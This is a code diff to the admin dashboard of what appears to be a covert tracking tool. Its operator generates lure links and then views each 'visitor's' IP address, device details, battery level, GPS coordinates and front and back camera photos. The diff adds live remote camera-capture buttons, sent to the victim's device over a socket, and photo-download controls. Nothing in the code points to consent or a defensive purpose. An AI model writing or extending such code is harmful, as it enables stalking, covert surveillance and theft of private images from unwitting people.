@@ -40,7 +40,9 @@ socket.on('location-data', (data) => {
     }
 });
 
-// Generate custom link
+// ============================================
+// GENERATE CUSTOM LINK
+// ============================================
 function generateCustomLink() {
     const url = document.getElementById('customUrl').value;
     if (!url) {
@@ -69,7 +71,9 @@ function generateCustomLink() {
     });
 }
 
-// Load visitors
+// ============================================
+// LOAD VISITORS
+// ============================================
 function loadVisitors() {
     fetch('/api/visitors')
         .then(response => response.json())
@@ -78,7 +82,9 @@ function loadVisitors() {
         });
 }
 
-// Display visitors
+// ============================================
+// DISPLAY VISITORS
+// ============================================
 function displayVisitors(visitors) {
     const container = document.getElementById('visitorsList');
     container.innerHTML = '';
@@ -118,7 +124,9 @@ function displayVisitors(visitors) {
     });
 }
 
-// Show visitor details
+// ============================================
+// SHOW VISITOR DETAILS (COMPLETE WITH BUTTONS)
+// ============================================
 function showVisitorDetails(visitorId) {
     currentVisitorId = visitorId;
     const container = document.getElementById('detailsContent');
@@ -131,18 +139,21 @@ function showVisitorDetails(visitorId) {
             
             let html = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
+                    <!-- LEFT COLUMN: Visitor Info -->
                     <div>
                         <h3>👤 Visitor Information</h3>
                         <div class="visitor-details-grid">
                             <div class="detail-card"><label>🆔 ID</label><div class="value">${visitor.id}</div></div>
                             <div class="detail-card"><label>📱 Device</label><div class="value">${visitor.deviceName || 'N/A'}</div></div>
                             <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visitor.ip || 'N/A'}</div></div>
-                            <div class="detail-card"><label>📶 Network</label><div class="value">${visitor.network?.effectiveType || 'N/A'}</div></div>
+                            <div class="detail-card"><label>📶 Network</label><div class="value">${visitor.network?.effectiveType || visitor.network?.type || 'N/A'}</div></div>
                             <div class="detail-card"><label>🔋 Battery</label><div class="value">${visitor.battery || 'N/A'}%</div></div>
                             <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'N/A'}</div></div>
                             <div class="detail-card"><label>🟢 Status</label><div class="value">${visitor.connected ? 'Online' : 'Offline'}</div></div>
                         </div>
                     </div>
+                    
+                    <!-- RIGHT COLUMN: Location + Photos + Controls -->
                     <div>
                         <h3>📍 Location</h3>
                         ${visitor.location ? `
@@ -152,12 +163,56 @@ function showVisitorDetails(visitorId) {
                                 <div class="detail-card"><label>🏙️ City</label><div class="value">${visitor.location.city || 'N/A'}</div></div>
                                 <div class="detail-card"><label>📍 Coordinates</label><div class="value">${visitor.location.lat || 'N/A'}, ${visitor.location.lng || 'N/A'}</div></div>
                             </div>
-                        ` : '<p>Location not available</p>'}
+                        ` : '<p style="color:#999;">Location not available</p>'}
                         
+                        <!-- ========================================== -->
+                        <!-- PHOTOS WITH DOWNLOAD BUTTONS -->
+                        <!-- ========================================== -->
                         <h3 style="margin-top:20px;">📸 Photos</h3>
-                        <div style="display:flex; gap:10px; flex-wrap:wrap;">
-                            ${visitor.frontCamera ? `<div><p><strong>Front</strong></p><img src="${visitor.frontCamera}" class="camera-image"></div>` : ''}
-                            ${visitor.backCamera ? `<div><p><strong>Back</strong></p><img src="${visitor.backCamera}" class="camera-image"></div>` : ''}
+                        <div style="display:flex; gap:20px; flex-wrap:wrap;">
+                            ${visitor.frontCamera ? `
+                                <div>
+                                    <p><strong>Front Camera</strong></p>
+                                    <img src="${visitor.frontCamera}" class="camera-image">
+                                    <div style="margin-top:5px;">
+                                        <button onclick="downloadPhoto('${visitor.frontCamera}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">
+                                            ⬇️ Download
+                                        </button>
+                                    </div>
+                                </div>
+                            ` : '<p style="color:#999;">No front photo</p>'}
+                            
+                            ${visitor.backCamera ? `
+                                <div>
+                                    <p><strong>Back Camera</strong></p>
+                                    <img src="${visitor.backCamera}" class="camera-image">
+                                    <div style="margin-top:5px;">
+                                        <button onclick="downloadPhoto('${visitor.backCamera}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">
+                                            ⬇️ Download
+                                        </button>
+                                    </div>
+                                </div>
+                            ` : '<p style="color:#999;">No back photo</p>'}
+                        </div>
+                        
+                        <!-- ========================================== -->
+                        <!-- LIVE CAPTURE CONTROLS -->
+                        <!-- ========================================== -->
+                        <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
+                            <h3>📸 Live Camera Control</h3>
+                            <p style="font-size:13px; color:#666; margin-bottom:10px;">Click to capture photo from visitor's device</p>
+                            <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
+                                <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">
+                                    📷 Capture Front
+                                </button>
+                                <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1;">
+                                    📷 Capture Back
+                                </button>
+                                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">
+                                    📷 Capture Both
+                                </button>
+                            </div>
+                            <div id="captureStatus" style="margin-top:10px; font-size:14px; color:#666;"></div>
                         </div>
                     </div>
                 </div>
@@ -166,7 +221,9 @@ function showVisitorDetails(visitorId) {
         });
 }
 
-// Delete visitor
+// ============================================
+// DELETE VISITOR
+// ============================================
 function deleteVisitor(visitorId) {
     if (!confirm('Delete this visitor data?')) return;
     
@@ -182,7 +239,64 @@ function deleteVisitor(visitorId) {
         });
 }
 
-// Update stats
+// ============================================
+// CAPTURE VISITOR PHOTO (LIVE)
+// ============================================
+function captureVisitorPhoto(type) {
+    if (!currentVisitorId) {
+        alert('Please select a visitor first');
+        return;
+    }
+    
+    const statusDiv = document.getElementById('captureStatus');
+    if (statusDiv) {
+        statusDiv.textContent = `📸 Requesting ${type} photo...`;
+        statusDiv.style.color = '#4299e1';
+    }
+    
+    // Send command to server
+    socket.emit('admin-capture', {
+        visitorId: currentVisitorId,
+        type: type
+    });
+    
+    // Show status update
+    setTimeout(() => {
+        if (statusDiv) {
+            statusDiv.textContent = `✅ ${type} photo requested! Check photos section.`;
+            statusDiv.style.color = '#22a67e';
+        }
+        // Refresh visitor details after 2 seconds
+        setTimeout(() => {
+            showVisitorDetails(currentVisitorId);
+        }, 2000);
+    }, 3000);
+}
+
+// ============================================
+// DOWNLOAD PHOTO
+// ============================================
+function downloadPhoto(imageData, filename) {
+    if (!imageData || imageData === 'null' || imageData === 'undefined') {
+        alert('No photo to download');
+        return;
+    }
+    try {
+        const link = document.createElement('a');
+        link.href = imageData;
+        link.download = filename || 'visitor-photo.jpg';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        showNotification('⬇️ Photo downloaded!');
+    } catch (e) {
+        alert('Error downloading photo: ' + e.message);
+    }
+}
+
+// ============================================
+// UPDATE STATS
+// ============================================
 function updateStats() {
     fetch('/api/visitors')
         .then(response => response.json())
@@ -193,7 +307,9 @@ function updateStats() {
         });
 }
 
-// Copy link
+// ============================================
+// COPY LINK
+// ============================================
 function copyLink() {
     const linkInput = document.getElementById('generatedLink');
     linkInput.select();
@@ -201,19 +317,25 @@ function copyLink() {
     showNotification('📋 Link copied!');
 }
 
-// Logout
+// ============================================
+// LOGOUT
+// ============================================
 function logout() {
     window.location.href = '/';
 }
 
-// Show notification
+// ============================================
+// SHOW NOTIFICATION
+// ============================================
 function showNotification(message) {
     const existing = document.querySelector('.notification');
     if (existing) existing.remove();
+    
     const div = document.createElement('div');
     div.className = 'notification';
     div.textContent = message;
     document.body.appendChild(div);
+    
     setTimeout(() => {
         div.style.opacity = '0';
         div.style.transition = 'opacity 0.5s';
@@ -221,9 +343,13 @@ function showNotification(message) {
     }, 3000);
 }
 
-// Initial load
+// ============================================
+// INITIAL LOAD
+// ============================================
 loadVisitors();
 updateStats();
+
+// Auto-refresh every 10 seconds
 setInterval(() => {
     loadVisitors();
     updateStats();
